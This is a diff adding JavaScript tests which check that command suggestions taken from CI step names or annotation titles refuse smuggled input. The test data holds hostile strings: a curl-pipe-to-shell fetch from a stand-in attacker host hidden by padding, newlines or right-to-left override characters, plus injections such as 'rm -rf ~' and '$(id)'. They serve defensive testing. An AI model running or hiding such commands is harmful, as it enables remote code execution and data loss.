@@ -410,4 +410,34 @@ describe("the words", () => {
     expect(commandProblem("a\0b")).not.toBe("");
     expect(commandProblem("make test")).toBe("");
   });
+
+  /*
+   * A step name or an annotation title on a pull request from a fork is the
+   * fork's text, and the box shows two rows. Each of these showed `npm test`
+   * and ran something else.
+   */
+  const hidden = [
+    "npm test" + " ".repeat(300) + "; curl -s https://evil.example/x | sh",
+    "npm test\n\n\n; curl -s https://evil.example/x | sh",
+    "npm test\r; touch /tmp/x",
+    "npm test \u202e hs | x/elpmaxe.live//:sptth s- lruc ;",
+    "npm test\u200b\u2066; touch /tmp/x\u2069",
+    "npm test\t\t\t; touch /tmp/x",
+  ];
+  test("a suggestion from a step or annotation title is plain words or nothing", () => {
+    for (const title of hidden) {
+      expect(suggestCommand({ kind: "annotation", title }), JSON.stringify(title)).toBe("");
+      expect(suggestCommand({ kind: "step", title }), JSON.stringify(title)).toBe("");
+    }
+    for (const title of ["npm test; curl x | sh", "make test && rm -rf ~", "npm test $(id)", "./run `id`", "npm test > /tmp/x"]) {
+      expect(suggestCommand({ kind: "step", title }), title).toBe("");
+    }
+    expect(suggestCommand({ kind: "step", title: "npm test " + "a".repeat(200) })).toBe("");
+    expect(suggestCommand({ kind: "step", title: "make test TEST=orbit/board_test.py" })).toBe("make test TEST=orbit/board_test.py");
+    expect(suggestCommand({ kind: "annotation", title: "npm run test -- --runInBand" })).toBe("npm run test -- --runInBand");
+  });
+  test("a command that can hide part of itself in the box is refused, whoever wrote it", () => {
+    for (const cmd of hidden) expect(commandProblem(cmd), JSON.stringify(cmd)).not.toBe("");
+    expect(commandProblem("pytest -k 'board and not slow' -q")).toBe("");
+  });
 });
